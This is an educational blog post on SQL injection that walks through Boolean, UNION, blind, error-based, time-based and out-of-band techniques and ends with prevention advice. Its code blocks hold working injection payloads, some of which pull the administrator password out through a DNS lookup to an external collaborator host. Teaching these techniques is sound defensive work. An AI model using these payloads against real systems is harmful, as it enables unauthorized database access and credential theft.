---
title: 'Understanding SQLi'
date: 2024-10-04 03:31:26
author: w0rmhol3
categories: 'Web 101'
tags: Web
cover: https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SQLi/cover_pic.jpg?raw=true
---
SQL Injection (SQLI) is a common web security vulnerability that occurs when an attacker manipulates the SQL query sent from an application to its underlying database. By altering the intended query, attackers can access, modify, or delete data without proper authorization. This form of attack typically occurs in the WHERE clause of SELECT queries and can lead to severe consequences such as unauthorized data access or even complete compromise of the server (e.g., gaining administrative privileges).<!--more-->

## Basic SQLI Techniques
Attackers often use simple techniques to detect if an application is vulnerable to SQLI. One such method is injecting single quotes (') into the query to cause a syntax error and gauge the system's response. Additionally, Boolean-based SQLI techniques involve injecting conditions such as:

```sql
OR 1=1 (TRUE, always succeeds)
OR 1=2 (FALSE, always fails)
OR 'a' <> 'b' (TRUE, logical condition)
```
By analysing how the application responds to these inputs, attackers can determine if the system is vulnerable.

## SQLi Union Attacks
The `UNION` SQL operator allows attackers to retrieve data from different tables within the database if SQLI vulnerabilities exist. The `UNION` command combines results of two or more `SELECT` queries into a single output, but several conditions must be met:

The queries must return the same number of columns.
The data types in corresponding columns must be compatible.
Techniques for Identifying the Number of Columns:
Increment the `ORDER BY` clause until an error is encountered (e.g., `ORDER BY 1--`, `ORDER BY 2--`).
Use `UNION SELECT` with varying numbers of NULL values to deduce the correct number of columns.

## SQLi in Oracle
Oracle databases require the FROM keyword in all SELECT queries, even if no actual table is queried. Attackers use the built-in table dual to craft malicious queries. For example:

```sql
' UNION SELECT NULL FROM DUAL--
```

To handle queries that return a single column, attackers often concatenate column values using a delimiter, such as:
```sql
' UNION SELECT username || '~' || password FROM users--
```

## SQLi in MySQL
In MySQL, SQL comments must have a space after `--`, and `#` can also be used for comments. Attackers use `UNION SELECT` payloads to identify which columns contain string-type data. For instance:

```sql
UNION SELECT 1, username FROM users--
```

## Blind SQLi
Blind SQLI occurs when an application does not display query errors or results directly, but logical conditions can still be exploited to infer data. For example, a tracking ID cookie might be used in an SQL query like:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
An attacker can exploit this using blind SQLI with a condition like:
```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
The injection forces a true condition and return password where first character is greater than m, allowing attackers to use Boolean logic and brute-force techniques to extract data.

## Error-Based SQLi
Error-based SQLI takes advantage of detailed error messages to extract data. Attackers manipulate queries to trigger errors that reveal sensitive information. 

The effectiveness (means if it works or not) depends on the boolean conditions set. For example:

```sql
' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
The result that we are supposed to look for is the difference in error response through the injection.

## Time-Based SQLi
When an application does not provide visible feedback from a query, time-based SQLI can be used to extract data by measuring server response times. Database-specific queries introduce delays to test conditions. It would be useful if the database handles query errors robustly. For instance:

`no time delay, true condition:`
```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'— 
```
`time delay, false condition:`
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
```
This delays the server's response if the condition evaluates to true, allowing attackers to infer data without direct output.

## Out-of-Band SQLi (OAST)
Out-of-Band Application Security Testing (OAST) relies on communication between the vulnerable server and an external system under the attacker's control. A typical OAST attack exploits DNS or HTTP requests to leak data. For example:

`Perform DNS lookup on a specific domain:`
```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'—
```
The above example performs a DNS lookup on a domain controlled by the attacker. Attackers can combine UNION and XXE (XML External Entity) to leak data via subdomains.

`SQLI in OAST to leak data, with the leaked data being part of the subdomain name:`
```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.upneavivflfs9z2xmz65vswzbqhi59ty.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual—
```
The query will be able to leak the password as part of the subdomain, such as

`example output:`
```
p4ssw0rd.upneavivflfs9z2xmz65vswzbqhi59ty.oastify.com
```
## Bypassing SQLi Filters
To bypass SQLI filters, attackers encode payloads or modify their structure using tools like Burp Suite's hackvector extension. This technique is effective for bypassing web application firewalls (WAFs) that attempt to block SQLI.

`Example:`
```sql
<@dec_entities>1 UNION SELECT username || '~' || password FROM users;<@/dec_entities>
```

## Checking Database Version
Attackers often check the database version to craft appropriate payloads. Here are some common sql commands that can be used:

`MySQL:`
```sql
SELECT @@version
```

`Oracle:`
```sql
SELECT * FROM v$version
```

`ProgreSQL:`
```sql
SELECT version()
```

## SQLi Prevention Methods
The most effective way to prevent SQLI is to use parameterized queries and prepared statements, which separate user input from the SQL query structure. For instance:

```java
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement preparedStatement = connection.prepareStatement(query);
preparedStatement.setString(1, input);
ResultSet resultSet = preparedStatement.executeQuery();
```

This approach ensures user input is treated as data, not as part of the SQL command. Additional best practices include:
- Input validation and whitelisting.
- Use of stored procedures.
- Minimizing database permissions.
- Enforcing the principle of least privilege.

By following these practices, the application will have reduced risk of SQL injection attacks and have an improved overall security posture.